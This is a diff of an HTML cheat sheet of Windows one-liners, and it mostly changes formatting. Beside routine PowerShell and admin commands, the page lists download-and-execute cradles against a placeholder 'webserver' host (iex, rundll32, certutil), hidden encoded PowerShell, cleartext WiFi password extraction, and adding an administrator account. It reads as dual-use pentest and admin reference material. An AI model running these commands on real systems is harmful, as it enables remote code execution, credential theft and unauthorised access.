@@ -1,18 +1,16 @@
-
 <!DOCTYPE html>
 
-<html>
+<html lang="en" data-content_root="../">
   <head>
     <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="generator" content="Docutils 0.17.1: http://docutils.sourceforge.net/" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="viewport" content="width=device-width, initial-scale=1" />
 
     <title>One-liners commands &#8212; Generic Config</title>
-    <link rel="stylesheet" type="text/css" href="../_static/pygments.css" />
-    <link rel="stylesheet" type="text/css" href="../_static/nature.css" />
-    <script data-url_root="../" id="documentation_options" src="../_static/documentation_options.js"></script>
-    <script src="../_static/jquery.js"></script>
-    <script src="../_static/underscore.js"></script>
-    <script src="../_static/doctools.js"></script>
+    <link rel="stylesheet" type="text/css" href="../_static/pygments.css?v=fa44fd50" />
+    <link rel="stylesheet" type="text/css" href="../_static/nature.css?v=601dbdee" />
+    <script src="../_static/documentation_options.js?v=2709fde1"></script>
+    <script src="../_static/doctools.js?v=888ff710"></script>
+    <script src="../_static/sphinx_highlight.js?v=dc90522c"></script>
     <link rel="index" title="Index" href="../genindex.html" />
     <link rel="search" title="Search" href="../search.html" />
     <link rel="next" title="Set hardware clock to UTC" href="utc-clock.html" />
@@ -42,18 +40,18 @@
           <div class="body" role="main">
             
   <section id="one-liners-commands">
-<h1>One-liners commands<a class="headerlink" href="#one-liners-commands" title="Permalink to this headline">¶</a></h1>
+<h1>One-liners commands<a class="headerlink" href="#one-liners-commands" title="Link to this heading">¶</a></h1>
 <p>Here are some useful short commands for Windows systems that may be useful.</p>
 <section id="basic-powershell-commands">
-<h2>Basic PowerShell commands<a class="headerlink" href="#basic-powershell-commands" title="Permalink to this headline">¶</a></h2>
+<h2>Basic PowerShell commands<a class="headerlink" href="#basic-powershell-commands" title="Link to this heading">¶</a></h2>
 <ul>
 <li><p><code class="docutils literal notranslate"><span class="pre">sls</span></code> (<code class="docutils literal notranslate"><span class="pre">Select-String</span></code>): look for a pattern.</p>
 <p>Example:</p>
 <div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="c1"># Search my-needle in the input</span>
-sls my-needle
+sls<span class="w"> </span>my-needle
 
 <span class="c1"># Search my-needle in files ending with .txt</span>
-sls -Path *.txt -Pattern my-needle
+sls<span class="w"> </span>-Path<span class="w"> </span>*.txt<span class="w"> </span>-Pattern<span class="w"> </span>my-needle
 </pre></div>
 </div>
 <p>Documentation:</p>
@@ -65,7 +63,7 @@ sls -Path *.txt -Pattern my-needle
 <li><p><code class="docutils literal notranslate"><span class="pre">gcm</span></code> (<code class="docutils literal notranslate"><span class="pre">Get-Command</span></code>): List cmdlets (PowerShell commands) matching a pattern.</p>
 <p>Example:</p>
 <div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="c1"># List commands using &quot;WMI&quot; in their names</span>
-gcm -noun *WMI*
+gcm<span class="w"> </span>-noun<span class="w"> </span>*WMI*
 </pre></div>
 </div>
 </li>
@@ -80,13 +78,6 @@ gcm -noun *WMI*
 <p>PowerShell also provides commands to browse the filesystem.
 Here is a correspondence table between PowerShell commands and commands from other systems, that are also available in PowerShell as aliases:</p>
 <table class="docutils align-default">
-<colgroup>
-<col style="width: 21%" />
-<col style="width: 8%" />
-<col style="width: 16%" />
-<col style="width: 17%" />
-<col style="width: 39%" />
-</colgroup>
 <thead>
 <tr class="row-odd"><th class="head" rowspan="2"><p>cmdlet</p></th>
 <th class="head" colspan="3"><p>Aliases</p></th>
@@ -231,20 +222,20 @@ Get-Host
 </pre></div>
 </div>
 <p>In order to use a drive, add a colon symbol to it:</p>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>ls alias:
-ls env:
-ls variable:
-ls env:path
-ls <span class="k">function</span>:h*
-cat <span class="k">function</span>:help
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>ls<span class="w"> </span>alias:
+ls<span class="w"> </span>env:
+ls<span class="w"> </span>variable:
+ls<span class="w"> </span>env:path
+ls<span class="w"> </span><span class="k">function</span>:h*
+cat<span class="w"> </span><span class="k">function</span>:help
 
 <span class="c1"># In order to get $PATH:</span>
-<span class="o">(</span>ls env:path<span class="o">)</span>.value
-cat env:path
-<span class="nb">echo</span> <span class="nv">$env</span>:path
+<span class="o">(</span>ls<span class="w"> </span>env:path<span class="o">)</span>.value
+cat<span class="w"> </span>env:path
+<span class="nb">echo</span><span class="w"> </span><span class="nv">$env</span>:path
 
 <span class="c1"># In order to set an environment variable globally, such as the one for Mirosoft symbols:</span>
-setx _NT_SYMBOL_PATH srv*C:<span class="se">\D</span>ebugSymbols*http://msdl.microsoft.com/download/symbols
+setx<span class="w"> </span>_NT_SYMBOL_PATH<span class="w"> </span>srv*C:<span class="se">\D</span>ebugSymbols*http://msdl.microsoft.com/download/symbols
 </pre></div>
 </div>
 <p>In order to use a provider, add two colons to it:</p>
@@ -253,53 +244,53 @@ setx _NT_SYMBOL_PATH srv*C:<span class="se">\D</span>ebugSymbols*http://msdl.mic
 </div>
 <p>Get the methods and properties:</p>
 <div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="c1"># For an object (instance of a class)</span>
-<span class="nv">$obj</span> <span class="p">|</span> Get-Member
-<span class="nv">$obj</span> <span class="p">|</span> gm
+<span class="nv">$obj</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Get-Member
+<span class="nv">$obj</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>gm
 
 <span class="c1"># For a class (for the static methods and properties)</span>
-<span class="nv">$obj</span> <span class="p">|</span> Get-Member -Static
+<span class="nv">$obj</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Get-Member<span class="w"> </span>-Static
 </pre></div>
 </div>
 <p>Set the default output encoding to UTF-8 (cf. <a class="reference external" href="https://learn.microsoft.com/fr-fr/powershell/module/microsoft.powershell.core/about/about_character_encoding?view=powershell-7.3">https://learn.microsoft.com/fr-fr/powershell/module/microsoft.powershell.core/about/about_character_encoding?view=powershell-7.3</a>)</p>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="nv">$PSDefaultParameterValues</span><span class="o">[</span><span class="s1">&#39;*:Encoding&#39;</span><span class="o">]</span> <span class="o">=</span> <span class="s1">&#39;utf8&#39;</span>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="nv">$PSDefaultParameterValues</span><span class="o">[</span><span class="s1">&#39;*:Encoding&#39;</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;utf8&#39;</span>
 </pre></div>
 </div>
 </section>
 <section id="download-and-run">
-<h2>Download and run<a class="headerlink" href="#download-and-run" title="Permalink to this headline">¶</a></h2>
+<h2>Download and run<a class="headerlink" href="#download-and-run" title="Link to this heading">¶</a></h2>
 <p>Download and run a script</p>
 <ul>
 <li><p>PowerShell (<code class="docutils literal notranslate"><span class="pre">iex</span></code> is an alias to <code class="docutils literal notranslate"><span class="pre">Invoke-Expression</span></code>):</p>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>powershell -exec bypass -c <span class="s2">&quot;(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr(&#39;http://webserver/payload.ps1&#39;)|iex&quot;</span>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>powershell<span class="w"> </span>-exec<span class="w"> </span>bypass<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr(&#39;http://webserver/payload.ps1&#39;)|iex&quot;</span>
 
-powershell.exe -exec bypass <span class="s2">&quot;iex (New-Object Net.Webclient).DownloadString(&#39;http://webserver/payload.ps1&#39;)&quot;</span>
+powershell.exe<span class="w"> </span>-exec<span class="w"> </span>bypass<span class="w"> </span><span class="s2">&quot;iex (New-Object Net.Webclient).DownloadString(&#39;http://webserver/payload.ps1&#39;)&quot;</span>
 </pre></div>
 </div>
 </li>
 <li><p>JavaScript through Rundll32 (used by Win32/Poweliks malware):</p>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>rundll32.exe javascript:<span class="s2">&quot;\..\mshtml,RunHTMLApplication&quot;</span><span class="p">;</span><span class="nv">o</span><span class="o">=</span>GetObject<span class="o">(</span><span class="s2">&quot;script:http://webserver/payload.sct&quot;</span><span class="o">)</span><span class="p">;</span>window.close<span class="o">()</span><span class="p">;</span>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>rundll32.exe<span class="w"> </span>javascript:<span class="s2">&quot;\..\mshtml,RunHTMLApplication&quot;</span><span class="p">;</span><span class="nv">o</span><span class="o">=</span>GetObject<span class="o">(</span><span class="s2">&quot;script:http://webserver/payload.sct&quot;</span><span class="o">)</span><span class="p">;</span>window.close<span class="o">()</span><span class="p">;</span>
 </pre></div>
 </div>
 </li>
 <li><p>Using <code class="docutils literal notranslate"><span class="pre">certutil</span></code>:</p>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 <span class="p">&amp;</span> certutil -decode payload.b64 payload.exe
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>certutil<span class="w"> </span>-urlcache<span class="w"> </span>-split<span class="w"> </span>-f<span class="w"> </span>http://webserver/payload.b64<span class="w"> </span>payload.b64<span class="w"> </span><span class="p">&amp;</span><span class="w"> </span>certutil<span class="w"> </span>-decode<span class="w"> </span>payload.b64<span class="w"> </span>payload.exe
 </pre></div>
 </div>
 </li>
 </ul>
 <p>Source: <a class="reference external" href="https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/amp/">https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/amp/</a></p>
 <p>Downloading files with PowerShell:</p>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="nv">$content</span> <span class="o">=</span> <span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s2">&quot;http://webserver/file.txt&quot;</span><span class="o">)</span>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="nv">$content</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>New-Object<span class="w"> </span>Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s2">&quot;http://webserver/file.txt&quot;</span><span class="o">)</span>
 
 <span class="c1"># Save to a file</span>
-Invoke-WebRequest -Uri http://webserver/file.txt -OutFile file.txt -UseBasicParsing
+Invoke-WebRequest<span class="w"> </span>-Uri<span class="w"> </span>http://webserver/file.txt<span class="w"> </span>-OutFile<span class="w"> </span>file.txt<span class="w"> </span>-UseBasicParsing
 
 <span class="c1"># With BITS (Background Intelligent Transfer Service) (ipmo = Import-Module)</span>
-ipmo BitsTransfer<span class="p">;</span>Start-BitsTransfer -Source <span class="s2">&quot;http://webserver/file.txt&quot;</span> -Destination C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\</span>
+ipmo<span class="w"> </span>BitsTransfer<span class="p">;</span>Start-BitsTransfer<span class="w"> </span>-Source<span class="w"> </span><span class="s2">&quot;http://webserver/file.txt&quot;</span><span class="w"> </span>-Destination<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\</span>
 </pre></div>
 </div>
 <p>Run a PowerShell script:</p>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>%windir%<span class="se">\S</span>ystem32<span class="se">\W</span>indowsPowerShell<span class="se">\v</span><span class="m">1</span>.0<span class="se">\p</span>owershell.exe -Noninteractive -ExecutionPolicy Bypass -Noprofile -file MyScript.ps1
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>%windir%<span class="se">\S</span>ystem32<span class="se">\W</span>indowsPowerShell<span class="se">\v</span><span class="m">1</span>.0<span class="se">\p</span>owershell.exe<span class="w"> </span>-Noninteractive<span class="w"> </span>-ExecutionPolicy<span class="w"> </span>Bypass<span class="w"> </span>-Noprofile<span class="w"> </span>-file<span class="w"> </span>MyScript.ps1
 </pre></div>
 </div>
 <p>Run PowerShell code endoded as UTF-16LE+Base64:</p>
@@ -312,48 +303,48 @@ ipmo BitsTransfer<span class="p">;</span>Start-BitsTransfer -Source <span class=
 <span class="c1"># -ep bypass or -exec bypass for -ExecutionPolicy bypass : set the default execution</span>
 <span class="c1">#       policy for the current session and saves it in $env:PSExecutionPolicyPreference</span>
 <span class="c1">#       (redundant when -enc is given)</span>
-start /b powershell -nop -sta -w <span class="m">1</span> -enc <span class="s2">&quot;</span><span class="k">$(</span>iconv -t utf16le &lt; payload.ps1 <span class="p">|</span> base64<span class="k">)</span><span class="s2">&quot;</span>
+start<span class="w"> </span>/b<span class="w"> </span>powershell<span class="w"> </span>-nop<span class="w"> </span>-sta<span class="w"> </span>-w<span class="w"> </span><span class="m">1</span><span class="w"> </span>-enc<span class="w"> </span><span class="s2">&quot;</span><span class="k">$(</span>iconv<span class="w"> </span>-t<span class="w"> </span>utf16le<span class="w"> </span>&lt;<span class="w"> </span>payload.ps1<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="k">)</span><span class="s2">&quot;</span>
 </pre></div>
 </div>
 </section>
 <section id="proxy-settings">
-<h2>Proxy settings<a class="headerlink" href="#proxy-settings" title="Permalink to this headline">¶</a></h2>
+<h2>Proxy settings<a class="headerlink" href="#proxy-settings" title="Link to this heading">¶</a></h2>
 <p>Get the HTTP proxy which is currently configured:</p>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>reg query <span class="s2">&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span> /v ProxyServer
-reg query <span class="s2">&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span> /v ProxyEnable
-netsh winhttp dump
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>reg<span class="w"> </span>query<span class="w"> </span><span class="s2">&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><span class="w"> </span>/v<span class="w"> </span>ProxyServer
+reg<span class="w"> </span>query<span class="w"> </span><span class="s2">&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><span class="w"> </span>/v<span class="w"> </span>ProxyEnable
+netsh<span class="w"> </span>winhttp<span class="w"> </span>dump
 </pre></div>
 </div>
 <p>Add a HTTP proxy:</p>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>netsh winhttp <span class="nb">set</span> proxy <span class="m">127</span>.0.0.1:3128
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>netsh<span class="w"> </span>winhttp<span class="w"> </span><span class="nb">set</span><span class="w"> </span>proxy<span class="w"> </span><span class="m">127</span>.0.0.1:3128
 </pre></div>
 </div>
 </section>
 <section id="wifi-profiles">
-<h2>WiFi profiles<a class="headerlink" href="#wifi-profiles" title="Permalink to this headline">¶</a></h2>
+<h2>WiFi profiles<a class="headerlink" href="#wifi-profiles" title="Link to this heading">¶</a></h2>
 <p>List available WiFi profiles:</p>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>netsh wlan show profiles
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>netsh<span class="w"> </span>wlan<span class="w"> </span>show<span class="w"> </span>profiles
 </pre></div>
 </div>
 <p>Export WiFi profiles (username and password) to <code class="docutils literal notranslate"><span class="pre">%APPDATA%\&lt;profile&gt;.xml</span></code>:</p>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>cmd.exe /c netsh wlan <span class="nb">export</span> profile <span class="nv">key</span><span class="o">=</span>clear <span class="nv">folder</span><span class="o">=</span><span class="s2">&quot;%APPDATA%&quot;</span>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>cmd.exe<span class="w"> </span>/c<span class="w"> </span>netsh<span class="w"> </span>wlan<span class="w"> </span><span class="nb">export</span><span class="w"> </span>profile<span class="w"> </span><span class="nv">key</span><span class="o">=</span>clear<span class="w"> </span><span class="nv">folder</span><span class="o">=</span><span class="s2">&quot;%APPDATA%&quot;</span>
 </pre></div>
 </div>
 <p>Source: <a class="reference external" href="https://securelist.com/shedding-skin-turlas-fresh-faces/88069/">https://securelist.com/shedding-skin-turlas-fresh-faces/88069/</a></p>
 <p>In PowerShell, without writing any file:</p>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="nv">$results</span> <span class="o">=</span> <span class="o">(</span>netsh wlan show profiles<span class="o">)</span> <span class="p">|</span>
-    Select-String <span class="s1">&#39;\:(.+)$&#39;</span> <span class="p">|</span> %<span class="o">{</span><span class="nv">$name</span><span class="o">=</span><span class="nv">$_</span>.Matches.Groups<span class="o">[</span><span class="m">1</span><span class="o">]</span>.Value.Trim<span class="o">()</span><span class="p">;</span> <span class="nv">$_</span><span class="o">}</span> <span class="p">|</span>
-    %<span class="o">{(</span>netsh wlan show profile <span class="nv">name</span><span class="o">=</span><span class="nv">$name</span> <span class="nv">key</span><span class="o">=</span>clear<span class="o">)}</span> <span class="p">|</span>
-    Select-String <span class="s1">&#39;Key Content\W+\:(.+)$&#39;</span> <span class="p">|</span> %<span class="o">{</span><span class="nv">$pass</span><span class="o">=</span><span class="nv">$_</span>.Matches.Groups<span class="o">[</span><span class="m">1</span><span class="o">]</span>.Value.Trim<span class="o">()</span><span class="p">;</span> <span class="nv">$_</span><span class="o">}</span> <span class="p">|</span>
-    %<span class="o">{[</span>PSCustomObject<span class="o">]</span>@<span class="o">{</span> <span class="nv">PROFILE_NAME</span><span class="o">=</span><span class="nv">$name</span><span class="p">;</span><span class="nv">PASSWORD</span><span class="o">=</span><span class="nv">$pass</span> <span class="o">}}</span>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="nv">$results</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>netsh<span class="w"> </span>wlan<span class="w"> </span>show<span class="w"> </span>profiles<span class="o">)</span><span class="w"> </span><span class="p">|</span>
+<span class="w">    </span>Select-String<span class="w"> </span><span class="s1">&#39;\:(.+)$&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>%<span class="o">{</span><span class="nv">$name</span><span class="o">=</span><span class="nv">$_</span>.Matches.Groups<span class="o">[</span><span class="m">1</span><span class="o">]</span>.Value.Trim<span class="o">()</span><span class="p">;</span><span class="w"> </span><span class="nv">$_</span><span class="o">}</span><span class="w"> </span><span class="p">|</span>
+<span class="w">    </span>%<span class="o">{(</span>netsh<span class="w"> </span>wlan<span class="w"> </span>show<span class="w"> </span>profile<span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="nv">$name</span><span class="w"> </span><span class="nv">key</span><span class="o">=</span>clear<span class="o">)}</span><span class="w"> </span><span class="p">|</span>
+<span class="w">    </span>Select-String<span class="w"> </span><span class="s1">&#39;Key Content\W+\:(.+)$&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>%<span class="o">{</span><span class="nv">$pass</span><span class="o">=</span><span class="nv">$_</span>.Matches.Groups<span class="o">[</span><span class="m">1</span><span class="o">]</span>.Value.Trim<span class="o">()</span><span class="p">;</span><span class="w"> </span><span class="nv">$_</span><span class="o">}</span><span class="w"> </span><span class="p">|</span>
+<span class="w">    </span>%<span class="o">{[</span>PSCustomObject<span class="o">]</span>@<span class="o">{</span><span class="w"> </span><span class="nv">PROFILE_NAME</span><span class="o">=</span><span class="nv">$name</span><span class="p">;</span><span class="nv">PASSWORD</span><span class="o">=</span><span class="nv">$pass</span><span class="w"> </span><span class="o">}}</span>
 
 <span class="c1"># Display the results or record them in files</span>
 <span class="nv">$results</span>
-<span class="nv">$results</span> <span class="p">|</span> Format-Table -Wrap
-<span class="nv">$results</span> <span class="p">|</span> Format-Table -AutoSize
-<span class="nv">$results</span> <span class="p">|</span> Out-GridView
-<span class="nv">$results</span> <span class="p">|</span> Export-Csv -Path .<span class="se">\w</span>ifi.csv -NoTypeInformation -Encoding ASCII
-<span class="nv">$results</span> <span class="p">|</span> Out-File -FilePath .<span class="se">\w</span>ifi.txt -Encoding ASCII
+<span class="nv">$results</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Format-Table<span class="w"> </span>-Wrap
+<span class="nv">$results</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Format-Table<span class="w"> </span>-AutoSize
+<span class="nv">$results</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Out-GridView
+<span class="nv">$results</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Export-Csv<span class="w"> </span>-Path<span class="w"> </span>.<span class="se">\w</span>ifi.csv<span class="w"> </span>-NoTypeInformation<span class="w"> </span>-Encoding<span class="w"> </span>ASCII
+<span class="nv">$results</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Out-File<span class="w"> </span>-FilePath<span class="w"> </span>.<span class="se">\w</span>ifi.txt<span class="w"> </span>-Encoding<span class="w"> </span>ASCII
 </pre></div>
 </div>
 <p>Sources:</p>
@@ -364,66 +355,66 @@ netsh winhttp dump
 </ul>
 </section>
 <section id="user-and-group-management">
-<h2>User and group management<a class="headerlink" href="#user-and-group-management" title="Permalink to this headline">¶</a></h2>
+<h2>User and group management<a class="headerlink" href="#user-and-group-management" title="Link to this heading">¶</a></h2>
 <p>Some commands to list and manage users and groups</p>
 <div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="c1"># Get information on the current user</span>
 whoami
-whoami /groups
-whoami /priv
-whoami /all
+whoami<span class="w"> </span>/groups
+whoami<span class="w"> </span>/priv
+whoami<span class="w"> </span>/all
 
 <span class="c1"># Local users and groups manager</span>
 lusrmgr.msc
 
 <span class="c1"># net command on local accounts</span>
-net user
-net localgroup
+net<span class="w"> </span>user
+net<span class="w"> </span>localgroup
 
 <span class="c1"># net command on Active Directory accounts</span>
-net user /domain
-net group
+net<span class="w"> </span>user<span class="w"> </span>/domain
+net<span class="w"> </span>group
 
 <span class="c1"># query command</span>
-query user
+query<span class="w"> </span>user
 
 <span class="c1"># Get information about the current sessions on a server</span>
 qwinsta
-query session
+query<span class="w"> </span>session
 
 <span class="c1"># PowerShell, with MS Exchange cmdlet</span>
 <span class="c1"># Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010</span>
-Get-User <span class="p">|</span> Export-CSV C:<span class="se">\T</span>emp<span class="se">\A</span>llUsers.csv -NoTypeInfo
+Get-User<span class="w"> </span><span class="p">|</span><span class="w"> </span>Export-CSV<span class="w"> </span>C:<span class="se">\T</span>emp<span class="se">\A</span>llUsers.csv<span class="w"> </span>-NoTypeInfo
 
 <span class="c1"># WMI (PowerShell)</span>
-Get-WmiObject Win32_UserAccount
-Get-CimInstance -ClassName Win32_UserAccount
-Get-CimInstance -ClassName Win32_Group
+Get-WmiObject<span class="w"> </span>Win32_UserAccount
+Get-CimInstance<span class="w"> </span>-ClassName<span class="w"> </span>Win32_UserAccount
+Get-CimInstance<span class="w"> </span>-ClassName<span class="w"> </span>Win32_Group
 
 <span class="c1"># Add an administrator user</span>
-net user newuser password /add
-net localgroup Administrators newuser /add
+net<span class="w"> </span>user<span class="w"> </span>newuser<span class="w"> </span>password<span class="w"> </span>/add
+net<span class="w"> </span>localgroup<span class="w"> </span>Administrators<span class="w"> </span>newuser<span class="w"> </span>/add
 </pre></div>
 </div>
 <p>In Powershell, enabling autologin:</p>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="nv">$key</span> <span class="o">=</span> <span class="s2">&quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span>
-Set-ItemProperty <span class="nv">$key</span> -Name AutoAdminLogon -Value <span class="m">1</span>
-Set-ItemProperty <span class="nv">$key</span> -Name DefaultUserName -Value <span class="s2">&quot;Administrateur&quot;</span>
-Set-ItemProperty <span class="nv">$key</span> -Name DefaultPassword -Value <span class="s2">&quot;password&quot;</span>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="nv">$key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span>
+Set-ItemProperty<span class="w"> </span><span class="nv">$key</span><span class="w"> </span>-Name<span class="w"> </span>AutoAdminLogon<span class="w"> </span>-Value<span class="w"> </span><span class="m">1</span>
+Set-ItemProperty<span class="w"> </span><span class="nv">$key</span><span class="w"> </span>-Name<span class="w"> </span>DefaultUserName<span class="w"> </span>-Value<span class="w"> </span><span class="s2">&quot;Administrateur&quot;</span>
+Set-ItemProperty<span class="w"> </span><span class="nv">$key</span><span class="w"> </span>-Name<span class="w"> </span>DefaultPassword<span class="w"> </span>-Value<span class="w"> </span><span class="s2">&quot;password&quot;</span>
 </pre></div>
 </div>
 <p>Spawn an elevated prompt when UAC is enabled (User Account Control):</p>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>Start-Process -Verb RunAs PowerShell
-saps -verb runas powershell
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>Start-Process<span class="w"> </span>-Verb<span class="w"> </span>RunAs<span class="w"> </span>PowerShell
+saps<span class="w"> </span>-verb<span class="w"> </span>runas<span class="w"> </span>powershell
 </pre></div>
 </div>
 <p>In order to login as administrator to a remote machine without using the built-in administrator (RID 500), a registry key needs to be set.</p>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>cmd /c reg add
-  HKLM<span class="se">\S</span>OFTWARE<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\C</span>urrentVersion<span class="se">\P</span>olicies<span class="se">\S</span>ystem
-  /v LocalAccountTokenFilterPolicy /t REG_DWORD /d <span class="m">1</span> /f
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>cmd<span class="w"> </span>/c<span class="w"> </span>reg<span class="w"> </span>add
+<span class="w">  </span>HKLM<span class="se">\S</span>OFTWARE<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\C</span>urrentVersion<span class="se">\P</span>olicies<span class="se">\S</span>ystem
+<span class="w">  </span>/v<span class="w"> </span>LocalAccountTokenFilterPolicy<span class="w"> </span>/t<span class="w"> </span>REG_DWORD<span class="w"> </span>/d<span class="w"> </span><span class="m">1</span><span class="w"> </span>/f
 
-PowerShell Set-ItemProperty
-    -Path <span class="s2">&quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System&quot;</span>
-    -Name LocalAccountTokenFilterPolicy -Value <span class="m">1</span> -Type DWord
+PowerShell<span class="w"> </span>Set-ItemProperty
+<span class="w">    </span>-Path<span class="w"> </span><span class="s2">&quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System&quot;</span>
+<span class="w">    </span>-Name<span class="w"> </span>LocalAccountTokenFilterPolicy<span class="w"> </span>-Value<span class="w"> </span><span class="m">1</span><span class="w"> </span>-Type<span class="w"> </span>DWord
 </pre></div>
 </div>
 <p>This has been described in many blog posts:</p>
@@ -434,27 +425,27 @@ PowerShell Set-ItemProperty
 </ul>
 </section>
 <section id="enumerate-live-objects">
-<h2>Enumerate live objects<a class="headerlink" href="#enumerate-live-objects" title="Permalink to this headline">¶</a></h2>
+<h2>Enumerate live objects<a class="headerlink" href="#enumerate-live-objects" title="Link to this heading">¶</a></h2>
 <p>Enumerate all processes:</p>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>tasklist /v
-query process *
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>tasklist<span class="w"> </span>/v
+query<span class="w"> </span>process<span class="w"> </span>*
 Get-Process
 <span class="c1"># &quot;gps&quot; and &quot;ps&quot; are aliases of Get-Process</span>
 </pre></div>
 </div>
 <p>Find processes from its name:</p>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>tasklist /v <span class="p">|</span> find /I <span class="s2">&quot;explorer.exe&quot;</span>  <span class="c1"># Only in cmd.exe, as &quot;find&quot; requires the quotes</span>
-Get-Process <span class="p">|</span> Select <span class="nv">Name</span><span class="o">=</span>explorer.exe
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>tasklist<span class="w"> </span>/v<span class="w"> </span><span class="p">|</span><span class="w"> </span>find<span class="w"> </span>/I<span class="w"> </span><span class="s2">&quot;explorer.exe&quot;</span><span class="w">  </span><span class="c1"># Only in cmd.exe, as &quot;find&quot; requires the quotes</span>
+Get-Process<span class="w"> </span><span class="p">|</span><span class="w"> </span>Select<span class="w"> </span><span class="nv">Name</span><span class="o">=</span>explorer.exe
 </pre></div>
 </div>
 <p>Enumerate all services:</p>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>Get-Service <span class="p">|</span> Export-CSV C:<span class="se">\T</span>emp<span class="se">\A</span>llServices.csv -NoTypeInfo
-gsv <span class="p">|</span> epcsv C:<span class="se">\T</span>emp<span class="se">\A</span>llServices.csv -NoTypeInfo
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>Get-Service<span class="w"> </span><span class="p">|</span><span class="w"> </span>Export-CSV<span class="w"> </span>C:<span class="se">\T</span>emp<span class="se">\A</span>llServices.csv<span class="w"> </span>-NoTypeInfo
+gsv<span class="w"> </span><span class="p">|</span><span class="w"> </span>epcsv<span class="w"> </span>C:<span class="se">\T</span>emp<span class="se">\A</span>llServices.csv<span class="w"> </span>-NoTypeInfo
 </pre></div>
 </div>
 </section>
 <section id="group-policy">
-<h2>Group Policy<a class="headerlink" href="#group-policy" title="Permalink to this headline">¶</a></h2>
+<h2>Group Policy<a class="headerlink" href="#group-policy" title="Link to this heading">¶</a></h2>
